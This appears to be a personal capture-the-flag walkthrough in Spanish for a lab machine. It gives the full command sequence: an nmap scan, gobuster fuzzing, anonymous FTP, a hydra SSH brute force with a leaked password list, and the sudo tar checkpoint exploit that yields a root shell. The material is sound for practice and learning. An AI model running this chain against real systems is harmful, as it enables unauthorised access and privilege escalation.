
```bash
#!/bin/bash
ping 10.10.49.106 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.49.106 -oN escaneo 
#Vemos los puertos 20, 21 y 80 abiertos y procedemos a hacer fuzzing web con gobuster para ver los directorios de esta
gobuster dir -u http://10.10.49.106/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
ftp 10.10.49.106 #Aprovechamos la vulnerabilidad ftp anonymous
cat locks.txt
cat task.txt
hydra 10.10.49.106 ssh -l lin -P locks.txt #Hacemos un ataque de fuerza bruta ya que conocemos un usuario y un listado de contraseñas
ssh lin@10.10.49.106 #Entramos en la maquina con el usuario y contraseña anteriores
#Ejecutamos el exploit encontrado
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
script /dev/null -c bash #Para obtener un promt
cd /root
cat root.txt
```
nmap![[Pasted image 20231119143459.png]]
Comandos en el servidor ftp![[Pasted image 20231119144219.png]]Archivos extraídos![[Pasted image 20231119144620.png]]
Hydra![[Pasted image 20231119144957.png]]
Vemos la flag e intentamos ver como escalar privilegios![[Pasted image 20231119145441.png]]
Encontramos un exploit![[Pasted image 20231119145352.png]]
Ejecutamos el exploit obtenemos un promt y encontramos la flag de root
![[Pasted image 20231119150110.png]]
